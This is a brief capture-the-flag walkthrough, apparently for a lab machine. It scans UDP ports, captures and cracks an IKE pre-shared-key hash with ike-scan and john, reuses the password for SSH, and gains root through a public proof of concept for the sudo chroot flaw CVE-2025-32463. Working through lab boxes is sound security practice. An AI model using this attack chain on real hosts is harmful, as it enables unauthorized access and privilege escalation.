nmap:
had to scan for udp ports with
`sudo nmap -sU 10.129.152.234`

```
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

using https://github.com/royhills/ike-scan to scan the ike service

Just ran this: 
`sudo ike-scan -M -A -n ike --pskcrack=hash.txt 10.129.152.234`

I guessed with ike as the vpn name, since we using ike-scan, hash was made, then used `ikescan2john hash.txt > hashchanged.txt`

Then I cracked with john and rockyou:
`john --wordlist=/usr/share/wordlists/rockyou.txt hashchanged.txt`

which gave me: `freakingrockstarontheroad`

Which is the ssh for the ike user on the box:

`ssh ike@10.129.152.234` with `freakingrockstarontheroad`

ran linpeas on the box and the sudo version was `sudo 1.9.17` 

there was a recent article on a vulnerability for sudo here:
https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot

PoC:https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh

scp'd it on the box, then chmod'd it and ran it, gave me root
